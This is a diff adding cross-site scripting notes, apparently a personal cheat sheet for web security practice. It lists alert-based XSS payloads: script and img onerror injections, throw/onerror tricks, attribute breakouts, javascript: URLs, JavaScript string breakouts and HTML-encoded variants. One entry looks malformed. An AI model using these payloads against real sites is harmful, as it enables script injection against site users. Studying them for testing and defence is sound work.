@@ -29,6 +29,35 @@ function handleResponse() {
 };
 </script>
 
-Some useful ways of executing JavaScript are:
+*************************************************************************
+
     <script>alert(document.domain)</script>
     <img src=1 onerror=alert(1)>
+    <script>onerror=alert;throw 1337</script>
+    <script>{onerror=alert}throw 1337</script>
+    onerror=alert;throw 1
+    ${alert(document.domain)}
+    
+
+
+*************************************************************************
+
+
+#XSS in html tag attributes
+      "><script>alert(document.domain)</script>
+      " autofocus onfocus=alert(document.domain) x="
+      "onmousealert"=alert(1)
+      <a href="javascript:alert(document.domain)">
+
+#XSS into javascript
+
+ 		<script>
+		var input = 'controllable data here';			=     </script><img src=1 onerror=alert(document.domain)>
+		</script>
+ 
+   *Breaking out javascript strings
+        '-alert(document.domain)-'
+		';alert(document.domain)//
+
+	* HTML-encoding
+	 	http://foo?&apos;-alert(1)-&apos;
